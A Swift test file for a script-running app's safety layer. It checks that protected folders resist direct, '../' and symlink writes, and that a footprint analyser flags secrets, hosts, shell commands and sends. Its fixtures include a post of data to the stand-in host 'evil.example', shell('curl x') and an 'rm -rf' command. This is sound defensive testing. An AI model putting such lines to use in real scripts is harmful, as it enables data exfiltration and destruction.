import Foundation
import Testing
@testable import RhinoCore

/// What a script may touch, and knowing what it will touch before it runs.
@Suite struct SafetyTests {
    @Test func scriptsCannotWriteIntoTheAppsOwnFolders() async throws {
        let home = FileManager.default.temporaryDirectory.appending(path: "rhino-home-\(UUID().uuidString)")
        let scripts = home.appending(path: "Scripts")
        let runs = home.appending(path: "Runs")
        let elsewhere = FileManager.default.temporaryDirectory.appending(path: "rhino-else-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: scripts, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: elsewhere, withIntermediateDirectories: true)
        // A shortcut that leads back into the protected place.
        try FileManager.default.createSymbolicLink(at: elsewhere.appending(path: "shortcut"), withDestinationURL: scripts)

        func run(_ source: String) async -> RunSummary {
            let engine = Engine(provider: Scripts(sources: ["m": source]), runsDirectory: runs, session: stubbedSession(), protectedDirectories: [home])
            return await engine.run("m", events: Recorder().record)
        }
        let quoted = { (url: URL) in "\"" + url.path(percentEncoded: false) + "\"" }

        let direct = await run("await write(\(quoted(scripts.appending(path: "evil.js"))), 'x');")
        #expect(direct.error?.message.contains("cannot write into the app's own folders") == true)
        let dotted = await run("await write(\(quoted(runs.appending(path: "../Scripts/evil.js"))), 'x');")
        #expect(dotted.error?.message.contains("cannot write into the app's own folders") == true)
        let linked = await run("await write(\(quoted(elsewhere.appending(path: "shortcut/evil.js"))), 'x');")
        #expect(linked.error?.message.contains("cannot write into the app's own folders") == true)
        #expect((try? FileManager.default.contentsOfDirectory(atPath: scripts.path(percentEncoded: false))) == [])

        // Its own run folder, and anywhere outside, are fine.
        let own = await run("await output.file('report.txt', 'ok');\nawait write(\(quoted(elsewhere.appending(path: "out.txt"))), 'ok');")
        #expect(own.error == nil)
        #expect(FileManager.default.fileExists(atPath: elsewhere.appending(path: "out.txt").path(percentEncoded: false)))
    }

    @Test func readsWhatAScriptReachesFor() {
        let footprint = ScriptFootprint(of: """
        // get("https://commented.example/x") is only a comment
        const note = "post(\\"https://in-a-string.example\\") is only text";
        const token = await secrets.get("GITHUB_TOKEN", "A token");
        const repo = await get("https://api.github.com/repos/a/b", { headers: { Authorization: token } });
        await post("https://hooks.example.com/notify", { stars: repo.data.stars });
        await write("~/Desktop/stars.txt", String(repo.data.stars));
        await output.file("stars.json", repo.data);
        await shell("git status");
        const summary = await ai.ask("Summarise: " + JSON.stringify(repo.data));
        notify("Done", summary);
        await run("Other script", { stars: 1 });
        """)
        #expect(footprint.items == [
            .secret("GITHUB_TOKEN"), .host("api.github.com"), .host("hooks.example.com"), .sends,
            .writes("~/Desktop/stars.txt"), .command("git status"), .ai, .notifies, .runs("Other script"),
        ])
    }

    @Test func saysWhenSomethingIsWorkedOutWhileRunning() {
        let footprint = ScriptFootprint(of: """
        const base = input.data.base;
        await get(base + "/users");
        await download(`https://${host}/file.zip`);
        await write(path, "x");
        await shell(`rm -rf ${folder}`);
        await http.request("DELETE", url);
        const text = await read("~/notes.txt");
        return await run("Build report", await run("Fetch orders"), { show: true });
        """)
        #expect(footprint.items == [
            .anyHost, .writesAnywhere, .anyCommand, .sends, .reads, .runs("Fetch orders"), .runs("Build report"),
        ])
        #expect(ScriptFootprint(of: "const f = new Function('return 1'); eval('2');").items == [.buildsCode])
    }

    @Test func aScriptThatOnlyAsksAndShowsHasNoFootprint() {
        let footprint = ScriptFootprint(of: """
        const name = await input.ask("Who?");
        const rows = await (await input.file()).csv();
        output.table(rows).name("Rows");
        await memory.set("last", name);
        await output.file("rows.json", rows);
        const getter = { get: 1 }; getter.get; const posted = "x";
        """)
        #expect(footprint.isEmpty)
    }

    @Test func noticesWhatAChangeAdds() {
        let first = ScriptFootprint(of: #"await get("https://api.example.com/a");"#)
        let approved = first.keys
        #expect(first.additions(to: approved).isEmpty)

        let same = ScriptFootprint(of: #"const r = await get("https://api.example.com/b"); output.json(r.data);"#)
        #expect(same.additions(to: approved).isEmpty)

        let more = ScriptFootprint(of: #"await get("https://api.example.com/a"); await post("https://evil.example/x", data); await shell("curl x");"#)
        #expect(more.additions(to: approved) == [.host("evil.example"), .sends, .command("curl x")])
        #expect(more.additions(to: []).count == 4)
    }
}
